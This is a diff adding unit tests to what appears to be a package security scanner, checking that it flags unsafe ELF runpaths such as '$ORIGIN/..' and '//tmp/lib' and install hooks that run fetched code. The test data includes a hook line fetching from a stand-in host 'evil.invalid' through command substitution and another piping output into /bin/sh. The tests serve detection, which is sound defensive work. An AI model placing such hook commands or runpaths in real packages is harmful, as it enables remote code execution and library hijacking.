@@ -183,9 +183,19 @@ def test_a014_allows_origin_relative_runpath():
     assert "A014" not in _ids(manifest)
 
 
+def test_a014_rejects_root_and_double_slash_temp():
+    for runpath in ("/", "//tmp/lib"):
+        manifest = [{"path": "/usr/bin/app",
+                     "elf": {"runpath": [runpath]}}]
+        assert "A014" in _ids(manifest), runpath
+
+
 def test_a014_rejects_traversal_out_of_origin():
     for runpath in ("$ORIGIN/../../../../tmp",
                     "$ORIGIN/../../../home",
+                    "$ORIGIN/..",
+                    "$ORIGIN/../..",
+                    "${ORIGIN}/..",
                     "/tmp/$ORIGIN"):
         manifest = [{"path": "/usr/bin/app",
                      "elf": {"runpath": [runpath]}}]
@@ -251,6 +261,13 @@ def test_a012_ignores_printed_instructions_about_fetch_or_paths():
 def test_a012_still_fires_on_printed_command_substitution():
     content = ("[Trigger]\nOperation = Install\n"
                "Exec = /usr/bin/echo \"$(curl https://evil.invalid/x)\"\n")
+    manifest = [{"path": "/etc/x.hook", "content": content}]
+    assert "A012" in _ids(manifest)
+
+
+def test_a012_sees_a_pipe_to_an_absolute_shell():
+    content = ("[Trigger]\nOperation = Install\n"
+               "Exec = /usr/bin/echo \"curl x\" | /bin/sh\n")
     manifest = [{"path": "/etc/x.hook", "content": content}]
     assert "A012" in _ids(manifest)
 
